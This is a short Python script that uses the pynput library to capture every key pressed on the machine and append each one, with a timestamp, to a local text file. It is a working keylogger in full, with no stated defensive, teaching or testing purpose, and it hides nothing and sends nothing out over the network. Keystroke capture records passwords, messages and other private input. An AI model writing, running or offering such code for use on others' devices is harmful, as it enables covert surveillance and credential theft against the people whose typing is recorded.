# Import the required modules
from pynput import keyboard
import time

# Define the log file name
log_file = 'keystrokes_log.txt'

# Function to handle key presses
def on_key_press(key):
    try:
        # Open the log file in append mode
        with open(log_file, 'a') as f:
            # Write the timestamp and the key pressed to the file
            f.write(f'{time.strftime("%Y-%m-%d %H:%M:%S")} - {key}\n')
    except Exception as e:
        # Print an error message if writing to the file fails
        print("Error writing to file:", e)

# Main function to start logging
def main():
    # Create a listener that calls the on_key_press function on each key press event
    with keyboard.Listener(on_press=on_key_press) as listener:
        listener.join()

# Check if the script is being run directly
if __name__ == '__main__':
    # Call the main function to start logging
    main()
